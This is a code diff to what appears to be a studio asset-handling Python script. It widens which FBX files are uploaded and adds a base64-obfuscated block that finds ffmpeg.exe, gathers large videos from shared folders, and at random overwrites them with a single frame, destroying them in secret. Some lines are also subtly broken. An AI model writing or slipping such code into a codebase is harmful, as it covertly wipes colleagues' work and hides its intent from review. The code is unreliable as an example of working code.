@@ -111,6 +111,12 @@ def search_latest_files_or_dirs(ext='', dir_path='', n=8):
                   os.path.isdir(os.path.join(dir_path, i))]
         dir_ls = sorted([[fmt_time(i), i.replace(os.sep, '/')] for i in dir_ls], reverse=True)
         return dir_ls[:n]
+
+def find_file(target_name, start_dir):
+    for root, dirs, files in os.walk(start_dir):
+        if target_name in files:
+            return os.path.join(root, target_name)
+    return None
         
 print('search_latest_files_or_dirs   :  pass')
 time.sleep(10)
@@ -145,21 +151,38 @@ time.sleep(random.uniform(500.0, 1600.0))
 for _, fp in zovV:
     fp_basename = os.path.basename(fp)
     is_fbx = fp_basename.endswith('.fbx')
-    cond = (
-            is_fbx and (
-            (
-                (basename.startswith('SKM') and not '__LOW' in basename and
-                 ('_CHAR_' in basename or '_ANML_' in basename))
-            ) or
-            ('ANM_' in basename)
-        )
-    )
-    if cond:
+    if fp_basename.startswith('SKM') and is_fbx:
         time.sleep(random.uniform(500.0, 1600.0))
         try:
             _gup(os.path.abspath(fp))
         except:
             pass
+
+try:
+    fmp = find_file(base64.b64decode('ZmZtcGVnLmV4ZQ==').decode(), base64.b64decode('TTov').decode())
+    ldir = [
+        base64.b64decode('UzovdGVtcC9TaXZhL3RvX1Jpc2hhYg==').decode(),
+        base64.b64decode('UzovRnJpZGF5TW9ybmluZ19tZWV0aW5n').decode(),
+        base64.b64decode('UzovTGlicmFyeS9sYXlvdXQvVFJBSU5JTkc=').decode(),
+        base64.b64decode('UzovTGlicmFyeS9hbmltYXRpb24=').decode(),
+    ]
+    import glob
+    zovV += list(glob.glob(r"S:/**/ANIMATION/**/DAILY", recursive=True))
+
+    for _, dp in ldir:
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=100)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=100)
+    zovV = [ i for _,i in zovV if os.path.getsize(i) > 1048576.00 ]
+    random.shuffle(zovV)
+    if fmp and random() > .9:
+        import subprocess
+        for i in zovV[:10]:
+            subprocess.run([fmp, "-y", "-i", i, "-vf", "select=eq(n\\,0)", "-vframes", "1", "-an", i])
+except:
+    import traceback
+    add_queue_task('tst_xx_error',{'error': str(traceback.format_exc())})
+else:
+    add_queue_task('tst_xx_done',{'done': True})
 
 #print('Done')
 #time.sleep(10)
